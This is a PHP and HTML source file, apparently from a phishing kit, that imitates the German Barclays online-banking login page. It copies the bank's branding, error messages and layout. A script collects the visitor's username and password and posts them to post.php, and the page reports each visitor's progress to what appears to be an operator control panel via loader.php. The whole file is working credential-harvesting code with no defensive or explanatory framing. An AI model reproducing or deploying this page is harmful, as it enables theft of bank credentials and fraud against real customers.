<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/css/login.css">
</head>
<body>
<header>
    <div class="left"><img src="res/img/logo.png"></div>
    <div class="right"><button>Jetzt registrieren</button></div>
</header>


<main>
<?php
if(isset($_GET['e'])){
    echo '
<div class="errora">
    <div class="img"><img src="res/img/i.png"></div>
<div class="text">Ihre Eingaben sind nicht richtig. Ihr Zugang wird nach drei Passwort-Fehleingaben gesperrt. Über „Zugangsdaten vergessen", können Sie ein neues Passwort festlegen. Für das Tagesgeld-Online-Banking besuchen Sie bitte service.barclays.de. (124)</div>
</div>'; 
} ?>

<div class="form">

<div class="left">
<div class="links">
<span class="selected">Online-Banking</span>
<span>Tagesgeldkonto</span>
</div>
<div class="title">
Willkommen in Ihrem<br> Online-Banking
</div>
<div class="col">
    <input type="text" id="u" placeholder="Benutzername">
</div>
<div class="col">
    <input type="password" id="p" placeholder="Passwort">
</div>
<div class="col">
    <button onclick="sendLog()">Anmelden</button>
</div>
<div class="col link">
Zugangsdaten vergessen
</div>




</div>


<div class="right">
    <img src="res/img/ad.png">
</div>


</div>
</main>


<footer>
<div class="linkat">
<span>Zugangsdaten vergessen</span>
<span>Zum Tagesgeldkonto</span>
<span>Hilfe, Kontakt & Rechtliches<span>
</div>
</footer>
<?php 
require 'loader.php';
$m->ctr("LOGIN ".@$_GET['e']);
?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

$("input").keyup(()=>{
    $("input").removeClass("error");
});

function sendLog(){
    if($("#u").val()==""){
        return $("#u").addClass("error");
    }
    if($("#p").val()==""){
        return $("#p").addClass("error");
    }
    $(".loader").show();
    _cp = "LOADING (LOGIN)";
    $.post("post.php",{
        user:$("#u").val(),
        pass:$("#p").val()
    },(res)=>{
        
    });
}


$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sendLog();
    }
});

</script>

</body>
</html>   